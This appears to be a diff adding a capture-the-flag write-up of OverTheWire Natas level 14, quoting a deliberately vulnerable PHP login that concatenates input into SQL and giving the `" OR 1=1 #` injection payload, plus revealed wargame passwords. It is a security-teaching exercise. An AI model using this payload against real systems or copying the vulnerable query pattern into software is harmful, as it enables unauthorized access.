@@ -931,10 +931,79 @@ File headers can be **spoofed**, so they’re not reliable for security!
 
 ### Level 14
 
-- **Date**: 2026-03-16
+- **Date**: 2026-03-31
 - **URL**: `http://natas14.natas.labs.overthewire.org`
 - **Password**: `z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ`
-- **Tools**: Web Browser, `curl`, `PHP`
+- **Tools**: Web Browser, `SQL`
+
+#### The Solution
+
+Use CTRL + U to view the page source. And notice:
+
+```html
+<div id="content">
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password"><br>
+<input type="submit" value="Login" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+Let's check out that source code (URL/index-source.html):
+
+```php
+<?php
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas14', '<censored>');
+    mysqli_select_db($link, 'natas14');
+
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
+            echo "Successful login! The password for natas15 is <censored><br>";
+    } else {
+            echo "Access denied!<br>";
+    }
+    mysqli_close($link);
+} else {
+?>
+```
+
+Notice that the `username` and `password` parameters are being directly concatenated into the SQL query without any sanitization!
+
+We can get all users from the database by making the query always true with `OR 1=1`:
+```sql
+SELECT * from users where username="" OR 1=1 # " and password=""
+```
+The `#` is used to comment out the rest of the query.
+
+So fill in `username` with `" OR 1=1 #` and `password` with anything and submit the form.
+
+And you will see:
+```html
+<div id="content">
+Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+#### The Lesson
+
+Use prepared statements to prevent **SQL injection**!
+
+## Levels 15 - 20
+
+### Level 15
+
+- **Date**: 2026-03-31
+- **URL**: `http://natas15.natas.labs.overthewire.org`
+- **Password**: `SdqIqBsFcz3yotlNYErZSZwblkm0lrvx`
+- **Tools**: Web Browser
 
 #### The Solution
 
